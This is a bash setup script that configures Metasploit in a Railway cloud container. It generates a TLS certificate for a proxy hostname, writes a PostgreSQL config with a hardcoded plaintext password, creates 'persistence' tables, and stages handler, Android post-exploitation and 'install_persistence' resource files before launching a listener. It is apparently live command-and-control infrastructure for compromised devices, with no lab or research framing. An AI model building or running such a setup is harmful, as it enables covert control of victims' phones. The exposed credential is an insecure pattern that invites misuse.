#!/bin/bash

# Setup script to run inside Railway container
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              🚀 Railway Container Setup                          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Create necessary directories
mkdir -p /root/.msf4/ssl
mkdir -p /root/.msf4/modules/post/android/manage

# Generate SSL certificate if not exists
if [ ! -f /root/.msf4/ssl/cert.pem ]; then
    echo "🔐 Generating SSL certificate..."
    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
        -subj "/C=US/ST=State/L=City/O=System/CN=metro.proxy.rlwy.net" \
        -keyout /root/.msf4/ssl/key.pem \
        -out /root/.msf4/ssl/cert.pem 2>/dev/null
    
    cat /root/.msf4/ssl/key.pem /root/.msf4/ssl/cert.pem > /root/.msf4/ssl/combined.pem
    echo "✅ SSL certificate generated"
fi

# Configure database
cat > /root/.msf4/database.yml << YAML_DB
production:
  adapter: postgresql
  database: railway
  username: postgres
  password: oNnmkkGTsBScDMhJGyuPWbHqfBegneKo
  host: postgres.railway.internal
  port: 5432
  pool: 200
  timeout: 5
  encoding: utf8
  sslmode: prefer
  reconnect: true
YAML_DB

echo "✅ Database configuration created"

# Initialize database tables
echo "🗄️  Initializing database tables..."
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-f /root/railway_persistence_tables.sql 2>&1 | grep -E "(NOTICE|CREATE|ERROR)"

if [ $? -eq 0 ]; then
    echo "✅ Database tables created"
else
    echo "⚠️  Database initialization had errors (may already exist)"
fi

# Copy handler configs to root
cp /root/railway_handler_final.rc /root/ 2>/dev/null
cp /root/post_exploit_railway.rc /root/ 2>/dev/null
cp /root/install_persistence.rc /root/ 2>/dev/null

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    ✅ Setup Complete!                            ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "🚀 To start handler:"
echo "   msfconsole -r /root/railway_handler_final.rc"
echo ""
